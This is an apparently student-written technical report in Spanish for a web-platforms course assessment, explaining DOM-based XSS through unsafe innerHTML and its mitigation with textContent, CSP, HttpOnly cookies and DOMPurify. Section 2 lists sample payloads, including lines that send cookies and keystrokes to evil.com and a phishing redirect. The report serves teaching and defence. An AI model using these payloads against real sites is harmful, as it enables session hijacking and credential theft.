# 🔒 Mini-Informe Técnico: Auditoría XSS

> **Evaluación CIB302 — Ítem 3: Ciberseguridad**  
> Demostración de Cross-Site Scripting (XSS) y mitigación

---

## 1. ¿Qué es XSS (Cross-Site Scripting)?

**XSS** es una vulnerabilidad de seguridad web que permite a un atacante **inyectar código JavaScript malicioso** en una página web vista por otros usuarios. Ocurre cuando una aplicación incluye datos no confiables en su salida HTML sin la debida validación o escape.

### Tipos de XSS:

| Tipo | Descripción | Ejemplo |
|------|-------------|---------|
| **Reflected XSS** | El payload se refleja desde el servidor en la respuesta HTTP | URL con parámetro malicioso |
| **Stored XSS** | El payload se almacena en la base de datos y se muestra a todos los usuarios | Comentario con script inyectado |
| **DOM-based XSS** | La vulnerabilidad está en el código JavaScript del cliente | Uso de `innerHTML` con datos del usuario |

En esta demostración se implementó **DOM-based XSS** mediante el uso inseguro de `innerHTML`.

---

## 2. Demostración del Ataque

### Payload utilizado:
```html
<img src=x onerror=alert(1)>
```

### ¿Por qué funciona?

1. El usuario escribe `<img src=x onerror=alert(1)>` en el campo de comentario
2. El código vulnerable usa `innerHTML` para insertar el comentario:
   ```javascript
   // ❌ VULNERABLE
   contenedor.innerHTML += `<div>${comentario}</div>`;
   ```
3. El navegador interpreta el string como HTML real
4. Crea un elemento `<img>` con `src="x"` (una URL inválida)
5. Al no poder cargar la imagen, dispara el evento `onerror`
6. Ejecuta `alert(1)` — demostrando ejecución de código arbitrario

### ¿Qué podría hacer un atacante real?

En lugar de `alert(1)`, un atacante podría ejecutar:

```javascript
// Robar cookies de sesión
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

// Redireccionar a phishing
<img src=x onerror="window.location='https://falso-banco.com'">

// Capturar teclas (keylogger)
<img src=x onerror="document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}">

// Modificar el DOM (defacement)
<img src=x onerror="document.body.innerHTML='<h1>Sitio hackeado</h1>'">
```

---

## 3. ¿Por qué NO confiar en el cliente?

### Principio fundamental de seguridad:

> **"Toda entrada del usuario es potencialmente maliciosa y debe ser tratada como no confiable."**

### Razones:

#### 🔴 1. El navegador ejecuta todo lo que recibe
El navegador no distingue entre HTML/JS legítimo y malicioso. Si recibe `<script>alert(1)</script>` o `<img onerror=...>`, lo ejecuta sin cuestionarlo. **El navegador NO tiene contexto de seguridad** — solo sigue instrucciones.

#### 🔴 2. Las validaciones del lado del cliente se pueden evadir
Cualquier validación JavaScript en el frontend puede ser:
- Deshabilitada en DevTools
- Evitada con herramientas como Burp Suite, curl, o Postman
- Omitida modificando directamente las solicitudes HTTP

```javascript
// ❌ Esta validación es INÚTIL por sí sola:
if (comentario.includes('<script>')) {
    return; // Un atacante puede usar <img onerror=> en su lugar
}
```

#### 🔴 3. El usuario controla completamente el cliente
El atacante puede:
- Modificar el HTML/CSS/JS con DevTools
- Interceptar y alterar solicitudes HTTP
- Enviar datos directamente al servidor sin pasar por la UI
- Manipular cookies, localStorage, y sessionStorage

#### 🔴 4. Las consecuencias son devastadoras
El XSS puede causar:
- **Robo de identidad** (session hijacking)
- **Pérdida financiera** (transacciones fraudulentas)
- **Propagación de malware** (worms XSS)
- **Daño reputacional** (defacement)

---

## 4. Mitigación Aplicada

### Código VULNERABLE (innerHTML):
```javascript
// ❌ PELIGROSO — NO USAR
contenedor.innerHTML += `<div>${comentario}</div>`;
// El navegador interpreta HTML y ejecuta JavaScript
```

### Código SEGURO (textContent / innerText):
```javascript
// ✅ SEGURO — Recomendado
const div = document.createElement('div');
div.textContent = comentario;  // Escapa automáticamente el HTML
contenedor.appendChild(div);
// "<img src=x onerror=alert(1)>" se muestra como texto literal
```

### ¿Por qué `textContent` es seguro?
Porque trata **todo el contenido como texto plano**. Los caracteres especiales de HTML (`<`, `>`, `"`, `&`) NO son interpretados como código, sino mostrados literalmente.

| Método | Seguro | Interpreta HTML | Ejecuta JS |
|--------|--------|-----------------|------------|
| `innerHTML` | ❌ No | ✅ Sí | ✅ Sí |
| `textContent` | ✅ Sí | ❌ No | ❌ No |
| `innerText` | ✅ Sí | ❌ No | ❌ No |

---

## 5. Mitigaciones Adicionales Recomendadas

| Mitigación | Descripción |
|------------|-------------|
| **Sanitización en servidor** | Validar y escapar datos en el backend (NUNCA confiar solo en el frontend) |
| **Content Security Policy (CSP)** | Header HTTP que restringe la ejecución de scripts inline |
| **HttpOnly cookies** | Protege cookies de sesión contra robo vía `document.cookie` |
| **DOMPurify** | Librería JS que sanitiza HTML antes de insertarlo con innerHTML |
| **Encoding de salida** | Escapar caracteres HTML (`&lt;`, `&gt;`, `&amp;`) al renderizar |
| **Input validation** | Aceptar solo caracteres esperados (whitelist approach) |

### Ejemplo de CSP Header:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

---

## 6. Conclusión

La demostración confirma que **el uso de `innerHTML` con datos del usuario crea una vulnerabilidad XSS crítica**. La mitigación correcta es usar `textContent` o `innerText` para manejar texto del usuario, junto con:

1. **Validación en el servidor** (nunca solo en el cliente)
2. **Headers de seguridad** (CSP, X-XSS-Protection)
3. **Principio de mínimo privilegio** en cookies y sesiones

> **Regla de oro:** Nunca confiar en los datos que vienen del cliente. Todo input debe ser validado, sanitizado y escapado antes de ser procesado o mostrado.

---

> **Autor**: Evaluación CIB302 — Taller de Plataformas Web, AIEP  
> **Referencias**: OWASP XSS Prevention Cheat Sheet, WCAG 2.1
